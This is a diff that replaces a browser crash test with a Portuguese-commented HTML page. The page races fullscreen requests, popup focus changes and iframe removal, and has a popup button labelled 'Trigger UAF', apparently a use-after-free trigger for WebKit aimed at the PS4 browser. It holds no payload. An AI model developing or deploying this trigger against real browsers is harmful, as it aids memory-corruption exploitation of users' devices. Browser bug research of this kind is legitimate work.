@@ -1,81 +1,138 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-<style>
-
-#target {
-    width: 100px;
-    height: 100px;
-    background: red;
-}
-
-.scroller {
-    overflow: scroll;
-    width: 50px;
-    height: 50px;
-}
-
-.scroller > div {
-    height: 400px;
-}
-
-</style>
+<meta charset="UTF-8">
+<title>Fullscreen Focus Lifecycle Test (Fixed Order)</title>
 </head>
-
 <body>
-
-<div id="target">PASS if this does not crash.</div>
+    <button id="run">Run Test</button>
+    <div id="status">Iframe ready</div>
+    
+    <iframe
+        id="testFrame"
+        style="width:300px;height:200px;border:1px solid black;">
+    </iframe>
 
 <script>
+var iframe = document.getElementById("testFrame");
+var popup = null;
 
-(async function() {
+// Função auxiliar para delays baseados em Promise
+const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
 
-    let extraTimelines = [];
-
-    for (let i = 0; i < 32; i++) {
-        const source = document.createElement('div');
-        source.className = 'scroller';
-        source.appendChild(document.createElement('div'));
-        document.body.appendChild(source);
-        extraTimelines.push(new ScrollTimeline({ source }));
+// Função para solicitar fullscreen (suporte cross-browser, priorizando webkit para PS4)
+function enterFullscreen(element) {
+    if (element.requestFullscreen) {
+        return element.requestFullscreen();
+    } else if (element.webkitRequestFullscreen) {
+        // Específico para WebKit/PS4, deve ser chamado direto no onclick
+        return element.webkitRequestFullscreen();
+    } else if (element.msRequestFullscreen) {
+        return element.msRequestFullscreen();
     }
+    return Promise.reject(new Error('Fullscreen não suportado'));
+}
 
-    let pending = [];
-
-    for (let i = 0; i < 200; i++) {
-        const scroller = document.createElement('div');
-        scroller.className = 'scroller';
-        scroller.appendChild(document.createElement('div'));
-        document.body.appendChild(scroller);
-        pending.push(scroller);
-    }
-
-    let animation = target.animate(
-        { transform: 'translateX(50%)' },
-        1000000
+iframe.onload = function() {
+    var doc = iframe.contentDocument;
+    doc.open();
+    doc.write(
+        '<!DOCTYPE html>' +
+        '<html>' +
+        '<body>' +
+        '<h3>Iframe</h3>' +
+        '<div id="target" style="width:200px;height:150px;background:red"></div>' +
+        '</body>' +
+        '</html>'
     );
+    doc.close();
+};
 
-    await new Promise(requestAnimationFrame);
-    await new Promise(requestAnimationFrame);
+document.getElementById("run").onclick = async function() {
+    // --- CORREÇÃO CRÍTICA AQUI ---
+    // O pedido de fullscreen deve ser a PRIMEIRA ação síncrona após o clique
+    // para garantir que navegadores restritos (como PS4) aceitem.
+    var frameDocument = iframe.contentDocument;
+    var fullscreenElement = frameDocument.documentElement;
+    
+    try {
+        // Chamamos a função de fullscreen imediatamente
+        await enterFullscreen(fullscreenElement);
+        console.log("Fullscreen solicitado com sucesso (ou em andamento)");
+    } catch (e) {
+        console.error("Falha ao entrar em fullscreen:", e);
+        // Dependendo do teste, você pode querer parar aqui se o fullscreen for obrigatório
+    }
 
-    animation.effect.setKeyframes({
-        transform: 'translateX(100%)'
-    });
+    // --- FIM DA CORREÇÃO CRÍTICA ---
 
-    getComputedStyle(target).transform;
-    target.offsetWidth;
+    // Agora que o fullscreen foi iniciado, prosseguimos com o resto do teste
+    // Abrimos o popup (isso pode causar um leve atraso, mas o pedido de FS já foi enviado)
+    popup = window.open("", "_blank", "width=400,height=300");
 
-    for (let i = 0; i < pending.length; i++)
-        pending[i].style.scrollTimelineName = '--st' + i;
+    if (!popup) {
+        console.error("Popup bloqueado pelo navegador");
+        return;
+    }
 
-    if (window.internals && internals.suspendAnimations)
-        internals.suspendAnimations();
+    popup.document.open();
+    popup.document.write(
+        '<!DOCTYPE html>' +
+        '<html>' +
+        '<body>' +       
+        '<button onclick="triggerUAF()">Trigger UAF</button><br><br>' +
+        '<iframe id="target_frame" width="100" height="100"></iframe>' +
+        '<script>' +
+        'function triggerUAF() {' +
+        'var frame = document.getElementById("target_frame");' +
+        'if (!frame) return;' +           
+        'frame.webkitRequestFullscreen();' +          
+        ' setTimeout(() => {' +
+        'frame.remove();' +
+        '}, 15);' + 
+           
+        '}' +
+        '<\/script>' +
+        '</body>' +
+        '</html>'
+    );
+    popup.document.close();
 
-    document.body.innerHTML += '<br>PASS if this does not crash.';
+    // Sequência de foco (aguardando o popup abrir e o FS estabilizar)
+    await wait(100); // Aumentei um pouco o tempo inicial para garantir que o FS processe
+    if (!popup || popup.closed) return;
 
-})();
+    popup.focus();
+    await wait(300);
 
+    window.focus();
+    await wait(30);
+
+    try {
+        iframe.contentWindow.focus();
+    } catch (e) {}
+
+    await wait(30);
+
+    if (popup && !popup.closed) {
+        popup.close();
+    }
+
+    // Loop assíncrono para aguardar o fechamento do popup
+    while (popup && !popup.closed) {
+        await wait(20);
+    }
+
+    iframe.remove();
+};
+
+window.onblur = function() {
+    document.getElementById("status").innerHTML = "MAIN PAGE BLUR";
+};
+
+window.onfocus = function() {
+    document.getElementById("status").innerHTML = "MAIN PAGE FOCUS";
+};
 </script>
-
 </body>
 </html>
